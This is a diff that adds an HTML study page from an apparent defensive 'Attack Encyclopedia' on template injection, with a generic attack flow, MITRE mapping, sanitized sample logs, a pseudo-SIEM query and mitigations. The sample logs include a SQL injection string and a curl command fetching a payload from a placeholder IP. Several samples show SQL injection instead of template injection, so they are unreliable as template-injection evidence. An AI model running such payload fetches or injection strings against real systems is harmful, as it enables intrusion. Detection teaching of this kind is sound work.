@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Template Injection: attack flow, ATT&amp;CK mapping, logs, detections, SIEM queries, and mitigations.">
+  <title>Template Injection | Attack Encyclopedia</title>
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+<main class="detail-page">
+  <header class="site-header detail-header">
+    <a class="brand" href="../index.html">
+  <span class="brand-mark">AE</span>
+  <span><strong>ATTACK ENCYCLOPEDIA</strong><small>NAME IT. TRACE IT. DETECT IT.</small></span>
+</a>
+    <nav><a href="../index.html">← All attacks</a><span class="header-status">NOTE 147 / 170</span></nav>
+  </header>
+  <section class="detail-hero">
+    <div class="breadcrumb"><a href="../index.html">ENCYCLOPEDIA</a><span>/</span><span>WEB APPLICATION</span><span>/</span><b>TEMPLATE INJECTION</b></div>
+    <div class="detail-title-grid">
+      <div><span class="section-kicker">Web Application</span><h1>Template Injection</h1><p>Attacker input is evaluated as a template expression.</p><div class="tag-row"><span>Intermediate</span><span>Web</span><span>API</span></div></div>
+      <div class="attack-id-panel"><span>PRIMARY MAPPING</span><strong>Concept</strong><p>Initial Access / Execution</p><i></i></div>
+    </div>
+  </section>
+  <div class="study-layout"><aside class="study-nav">
+    <span>ON THIS PAGE</span>
+    <ol><li><a href="#what-is-it"><b>01</b>What is it?</a></li><li><a href="#plain-english"><b>02</b>How it works</a></li><li><a href="#why"><b>03</b>Why attackers use it</a></li><li><a href="#prerequisites"><b>04</b>Prerequisites</a></li><li><a href="#relationships"><b>05</b>Attack path possibilities</a></li><li><a href="#flow"><b>06</b>Step-by-step attack flow</a></li><li><a href="#mitre"><b>07</b>MITRE ATT&CK mapping</a></li><li><a href="#logs"><b>08</b>Logs and artifacts</a></li><li><a href="#log-examples"><b>09</b>Realistic log examples</a></li><li><a href="#detection"><b>10</b>Detection logic / SIEM</a></li><li><a href="#mitigations"><b>11</b>Mitigations</a></li><li><a href="#examples"><b>12</b>Real-world examples</a></li><li><a href="#questions"><b>13</b>Common questions</a></li></ol>
+    <div class="study-rule"><strong>DEFENDER’S RULE</strong><p>Do not hunt only for tools. Hunt for behavior, prerequisites, and the resulting state change.</p></div>
+  </aside><article class="study-note"><section class="note-section" id="what-is-it">
+  <div class="section-number">01</div>
+  <div><span class="section-kicker">CONCEPT</span><h2>What is it?</h2><p class="lead">Template Injection is an attack pattern in which attacker input is evaluated as a template expression. The learning goal is to identify the trust boundary being abused, the attacker’s sequence, and the telemetry that records it.</p></div>
+</section><section class="note-section" id="plain-english">
+  <div class="section-number">02</div>
+  <div><span class="section-kicker">MENTAL MODEL</span><h2>How it works in plain English</h2><p class="section-intro">Use this three-part model to understand the attack without memorizing a tool name.</p>
+  <div class="explanation-grid">
+    <div><span>01 / TRUST BEING ABUSED</span><p>The application trusts input, object identifiers, routing metadata, serialized data, or a client-side security assumption.</p></div>
+    <div><span>02 / ATTACKER ACTION</span><p>The attacker crafts a request that reaches an unintended code path, data object, interpreter, or internal service.</p></div>
+    <div><span>03 / DEFENDER VIEW</span><p>Compare the exact request to the application’s expected behavior and correlate it with server errors, database activity, file changes, and child processes.</p></div>
+  </div>
+  <h3 class="subsection-title">Worked example: how the sequence may look</h3>
+  <div class="scenario-list"><div><span>01 / Starting condition</span><p>Access to or influence over the relevant Web, API environment.</p></div><div><span>02 / Attacker action</span><p>Trigger the condition that enables template injection.</p></div><div><span>03 / Observable evidence</span><p>CDN, reverse proxy, WAF, application, API gateway, database, and identity logs.</p></div><div><span>04 / Detection decision</span><p>Baseline the affected identity, host, application, service, or protocol.</p></div><div><span>05 / Possible outcome</span><p>If successful, the attacker may continue with Web Shell. This is a possibility, not a guaranteed next step.</p></div></div>
+  <p class="scenario-note">This is a defensive learning scenario. Real incidents vary, and the listed outcome is only one possible path.</p></div>
+</section><section class="note-section" id="why">
+  <div class="section-number">03</div>
+  <div><span class="section-kicker">ATTACKER OBJECTIVE</span><h2>Why do attackers use it?</h2><ul class="study-list default"><li><span aria-hidden="true">→</span><p>Advance an objective associated with initial access / execution.</p></li><li><span aria-hidden="true">→</span><p>Exploit a weak control, unsafe default, exposed service, trusted relationship, or human decision.</p></li><li><span aria-hidden="true">→</span><p>Create access, gain privilege, evade defenses, steal information, or disrupt operations.</p></li></ul></div>
+</section><section class="note-section" id="prerequisites">
+  <div class="section-number">04</div>
+  <div><span class="section-kicker">REQUIRED CONDITIONS</span><h2>Prerequisites</h2><ul class="study-list check"><li><span aria-hidden="true">✓</span><p>Access to or influence over the relevant Web, API environment.</p></li><li><span aria-hidden="true">✓</span><p>Knowledge of the target’s technology, identities, configuration, or user behavior.</p></li><li><span aria-hidden="true">✓</span><p>A weakness, misconfiguration, exposed interface, stolen secret, or social opportunity.</p></li><li><span aria-hidden="true">✓</span><p>A path to observe success and continue toward the objective.</p></li></ul></div>
+</section><section class="note-section" id="relationships">
+  <div class="section-number">05</div>
+  <div><span class="section-kicker">ATTACK CHAIN</span><h2>Attack path possibilities</h2><p class="section-intro">Attack chains are not fixed. These links show common possibilities to investigate before and after this behavior.</p>
+  <div class="relationship-columns">
+    <div><span class="relationship-label before">POSSIBLE PRECURSORS — WHAT MAY LEAD HERE</span><div class="relationship-grid"><a href="port-scanning.html">
+        <span>T1046</span>
+        <strong>Port Scanning</strong>
+        <p>Probes identify hosts, ports, protocols, and services.</p>
+      </a><a href="exploitation-of-public-facing-application.html">
+        <span>T1190</span>
+        <strong>Exploitation of Public-Facing Application</strong>
+        <p>A vulnerability in an internet-facing service is exploited for initial access.</p>
+      </a><a href="open-redirect.html">
+        <span>Concept</span>
+        <strong>Open Redirect</strong>
+        <p>A trusted application redirects to an attacker-selected destination.</p>
+      </a><a href="authentication-bypass.html">
+        <span>T1190</span>
+        <strong>Authentication Bypass</strong>
+        <p>A logic or implementation flaw allows protected functionality without valid authentication.</p>
+      </a></div></div>
+    <div><span class="relationship-label after">POSSIBLE FOLLOW-ONS — WHAT THIS MAY ENABLE</span><div class="relationship-grid"><a href="web-shell.html">
+        <span>T1505.003</span>
+        <strong>Web Shell</strong>
+        <p>A server-side script provides persistent remote command execution.</p>
+      </a><a href="command-injection.html">
+        <span>T1059</span>
+        <strong>Command Injection</strong>
+        <p>Untrusted input reaches an operating-system command interpreter.</p>
+      </a><a href="cloud-metadata-service-abuse.html">
+        <span>Concept</span>
+        <strong>Cloud Metadata Service Abuse</strong>
+        <p>A workload metadata endpoint reveals temporary cloud credentials.</p>
+      </a><a href="session-cookie-theft.html">
+        <span>T1539</span>
+        <strong>Session Cookie Theft</strong>
+        <p>Authenticated browser cookies are stolen and replayed.</p>
+      </a></div></div>
+  </div></div>
+</section><section class="note-section" id="flow">
+  <div class="section-number">06</div>
+  <div><span class="section-kicker">SEQUENCE</span><h2>Step-by-step attack flow</h2><div class="flow-list"><div class="flow-step"><span>01</span><p>Reconnoiter the target and identify the exposed trust boundary.</p></div><div class="flow-step"><span>02</span><p>Prepare the infrastructure, lure, input, credential, or payload required.</p></div><div class="flow-step"><span>03</span><p>Trigger the condition that enables template injection.</p></div><div class="flow-step"><span>04</span><p>Confirm access or effect while attempting to avoid controls.</p></div><div class="flow-step"><span>05</span><p>Use the result for follow-on access, execution, collection, movement, persistence, or impact.</p></div><div class="flow-step"><span>06</span><p>Remove evidence, rotate infrastructure, or repeat against other targets.</p></div></div></div>
+</section><section class="note-section" id="mitre">
+  <div class="section-number">07</div>
+  <div><span class="section-kicker">FRAMEWORK</span><h2>MITRE ATT&amp;CK mapping</h2><div class="mitre-grid"><div class="mitre-card">
+      <div><span>TECHNIQUE</span><strong>Concept</strong></div>
+      <div><span>NAME</span><strong>No single ATT&amp;CK technique</strong></div>
+      <div><span>TACTIC</span><strong>Initial Access / Execution</strong></div>
+      
+    </div></div><p class="source-note">ATT&amp;CK is updated over time. Verify the live technique before operationalizing a detection.</p></div>
+</section><section class="note-section" id="logs">
+  <div class="section-number">08</div>
+  <div><span class="section-kicker">EVIDENCE</span><h2>Logs and artifacts</h2><ul class="study-list artifact"><li><span aria-hidden="true">◇</span><p>CDN, reverse proxy, WAF, application, API gateway, database, and identity logs.</p></li><li><span aria-hidden="true">◇</span><p>Unexpected parameters, status changes, response-size anomalies, errors, and stack traces.</p></li><li><span aria-hidden="true">◇</span><p>New server files, child processes, outbound connections, or unusual application identities.</p></li></ul></div>
+</section><section class="note-section" id="log-examples">
+  <div class="section-number">09</div>
+  <div><span class="section-kicker">RAW TELEMETRY</span><h2>Realistic log examples</h2><div class="evidence-warning">
+    <strong>REPRESENTATIVE, SANITIZED EXAMPLES</strong>
+    <p>These records use realistic field names and formats but synthetic organizations, users, addresses, and identifiers. A single event is not proof; correlate time, identity, source, target, and the resulting action.</p>
+  </div>
+  <div class="log-sample-stack"><div class="log-sample">
+      <div class="log-sample-head"><div><span>LOG SOURCE</span><strong>NGINX access log</strong></div><button class="copy-button" type="button" data-copy-query>COPY LOG</button></div>
+      <p>Raw HTTP request, status, bytes, referrer, user agent, and timing.</p>
+      <pre><code>203.0.113.48 - - [16/Jul/2026:14:20:09 +0000]
+&quot;POST /api/v1/search HTTP/1.1&quot; 500 1832 &quot;-&quot; &quot;python-requests/2.32&quot;
+request_time=1.842 upstream_status=500
+args=&quot;q=%27%20OR%201%3D1--&quot;</code></pre>
+      <div class="log-interpretation"><strong>HOW TO INTERPRET IT FOR TEMPLATE INJECTION</strong><p>Baseline the affected identity, host, application, service, or protocol.</p></div>
+    </div><div class="log-sample">
+      <div class="log-sample-head"><div><span>LOG SOURCE</span><strong>Web application firewall</strong></div><button class="copy-button" type="button" data-copy-query>COPY LOG</button></div>
+      <p>Normalized rule match showing request component, signature, action, and client.</p>
+      <pre><code>2026-07-16T14:20:09Z action=BLOCK severity=HIGH
+rule_id=942100 message=&quot;SQL Injection Attack Detected via libinjection&quot;
+client_ip=203.0.113.48 host=portal.corp.example
+method=POST uri=/api/v1/search matched_var=ARGS:q request_id=7f9c2c41</code></pre>
+      <div class="log-interpretation"><strong>HOW TO INTERPRET IT FOR TEMPLATE INJECTION</strong><p>Detect rare combinations of source, target, action, timing, volume, and result.</p></div>
+    </div><div class="log-sample">
+      <div class="log-sample-head"><div><span>LOG SOURCE</span><strong>Windows Security — Event 4688</strong></div><button class="copy-button" type="button" data-copy-query>COPY LOG</button></div>
+      <p>Process creation; correlate parent, child, command line, account, and logon ID.</p>
+      <pre><code>2026-07-16T14:28:04Z EventID=4688 Computer=APP01.corp.example
+SubjectUserName=svc-web SubjectLogonId=0x4A81C
+NewProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessName=C:\Windows\System32\inetsrv\w3wp.exe
+CommandLine=&quot;powershell.exe -NoProfile -NonInteractive &lt;redacted&gt;&quot;
+TokenElevationType=%%1937 MandatoryLabel=S-1-16-8192</code></pre>
+      <div class="log-interpretation"><strong>HOW TO INTERPRET IT FOR TEMPLATE INJECTION</strong><p>Correlate identity, endpoint, network, application, and control-plane evidence across the sequence.</p></div>
+    </div><div class="log-sample">
+      <div class="log-sample-head"><div><span>LOG SOURCE</span><strong>Linux auditd — EXECVE/SYSCALL</strong></div><button class="copy-button" type="button" data-copy-query>COPY LOG</button></div>
+      <p>Executed program and syscall result; join records by the audit message ID.</p>
+      <pre><code>type=SYSCALL msg=audit(1784212084.412:8841): arch=c000003e syscall=59
+success=yes exit=0 pid=24891 ppid=24872 auid=1001 uid=33 exe=&quot;/usr/bin/curl&quot;
+type=EXECVE msg=audit(1784212084.412:8841): argc=3 a0=&quot;curl&quot;
+a1=&quot;-fsSL&quot; a2=&quot;http://198.51.100.24/payload&quot;</code></pre>
+      <div class="log-interpretation"><strong>HOW TO INTERPRET IT FOR TEMPLATE INJECTION</strong><p>Prioritize activity followed by successful access, privilege change, execution, or data movement.</p></div>
+    </div></div>
+  <div class="investigation-prompts">
+    <strong>READ EACH LOG WITH FIVE QUESTIONS</strong>
+    <ol><li>Who or what identity acted?</li><li>From which device, process, IP, or workload?</li><li>What target and operation were involved?</li><li>Did it fail, succeed, or change state?</li><li>What correlated event happened immediately before and after?</li></ol>
+  </div></div>
+</section><section class="note-section" id="detection">
+  <div class="section-number">10</div>
+  <div><span class="section-kicker">ANALYTICS</span><h2>Detection logic / SIEM queries</h2><ul class="study-list detection-list"><li><span aria-hidden="true">⌁</span><p>Baseline the affected identity, host, application, service, or protocol.</p></li><li><span aria-hidden="true">⌁</span><p>Detect rare combinations of source, target, action, timing, volume, and result.</p></li><li><span aria-hidden="true">⌁</span><p>Correlate identity, endpoint, network, application, and control-plane evidence across the sequence.</p></li><li><span aria-hidden="true">⌁</span><p>Prioritize activity followed by successful access, privilege change, execution, or data movement.</p></li></ul><div class="query-stack"><div class="query-card">
+      <div class="query-head"><div><span>Pseudo-SIEM</span><strong>Behavioral detection template</strong></div><button class="copy-button" type="button" data-copy-query>COPY QUERY</button></div>
+      <pre><code>FROM security_events
+WHERE event_time &gt; now() - 30m
+  AND behavior = &quot;Template Injection&quot;
+GROUP BY source, target, user
+HAVING count(*) &gt; baseline(source, target, user)
+   OR rare(action, source, target) = true
+CORRELATE WITH success, privilege_change, execution, data_access</code></pre>
+    </div></div></div>
+</section><section class="note-section" id="mitigations">
+  <div class="section-number">11</div>
+  <div><span class="section-kicker">HARDENING</span><h2>Mitigations</h2><ul class="study-list shield"><li><span aria-hidden="true">◆</span><p>Reduce exposed attack surface and remove unused services, identities, features, and trust relationships.</p></li><li><span aria-hidden="true">◆</span><p>Apply least privilege, strong authentication, secure defaults, segmentation, and timely patching.</p></li><li><span aria-hidden="true">◆</span><p>Validate untrusted input and independently authorize sensitive operations.</p></li><li><span aria-hidden="true">◆</span><p>Centralize and protect relevant logs; test detections with controlled simulations.</p></li><li><span aria-hidden="true">◆</span><p>Maintain a response playbook for containment, credential rotation, evidence preservation, and recovery.</p></li></ul></div>
+</section><section class="note-section" id="examples">
+  <div class="section-number">12</div>
+  <div><span class="section-kicker">IN THE WILD</span><h2>Real-world examples</h2><ul class="study-list case"><li><span aria-hidden="true">↳</span><p>Template Injection appears in opportunistic campaigns and targeted intrusions when the required condition exists.</p></li><li><span aria-hidden="true">↳</span><p>Real incidents usually combine it with credential theft, phishing, exploitation, persistence, or exfiltration.</p></li><li><span aria-hidden="true">↳</span><p>The best case studies describe the full attack chain rather than an isolated tool or indicator.</p></li></ul></div>
+</section><section class="note-section" id="questions">
+  <div class="section-number">13</div>
+  <div><span class="section-kicker">REVIEW</span><h2>Common questions</h2><div class="questions"><details open><summary><span>01</span>What makes Template Injection possible?</summary><p>A trust assumption fails: an identity, input, component, network message, user decision, or software relationship is accepted without enough verification.</p></details><details><summary><span>02</span>What should a defender collect first?</summary><p>Start with logs closest to the decision point, then add identity, endpoint, network, and control-plane context.</p></details><details><summary><span>03</span>How should I study this attack?</summary><p>Learn the concept, identify prerequisites, map observable steps, write a detection hypothesis, and validate it safely in a lab.</p></details></div><h3 class="subsection-title">Primary verification sources</h3><div class="reference-links"><a href="https://attack.mitre.org/techniques/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK Enterprise Techniques ↗</a><a href="https://learn.microsoft.com/windows/security/threat-protection/auditing/" target="_blank" rel="noreferrer">Microsoft Windows security auditing ↗</a><a href="https://learn.microsoft.com/entra/identity/monitoring-health/concept-sign-ins" target="_blank" rel="noreferrer">Microsoft Entra sign-in logs ↗</a><a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html" target="_blank" rel="noreferrer">AWS CloudTrail event reference ↗</a><a href="https://cloud.google.com/logging/docs/audit" target="_blank" rel="noreferrer">Google Cloud audit logs ↗</a><a href="https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/" target="_blank" rel="noreferrer">Kubernetes auditing ↗</a></div></div>
+</section></article></div>
+  <nav class="note-pagination" aria-label="Browse attack notes">
+    <a href="tcp-syn-flood.html"><span>← PREVIOUS NOTE</span><strong>TCP SYN Flood</strong></a>
+    <a href="../index.html">VIEW FULL CATALOG</a>
+    <a href="timestomping.html"><span>NEXT NOTE →</span><strong>Timestomping</strong></a>
+  </nav>
+  <footer>
+  <a class="brand" href="../index.html">
+  <span class="brand-mark">AE</span>
+  <span><strong>ATTACK ENCYCLOPEDIA</strong><small>NAME IT. TRACE IT. DETECT IT.</small></span>
+</a>
+  <p>Built for structured defensive learning. Validate every detection against your own environment.</p>
+  <a href="../index.html">ALL ATTACKS ↑</a>
+</footer>
+</main>
+<script src="../detail.js" defer></script>
+</body>
+</html>
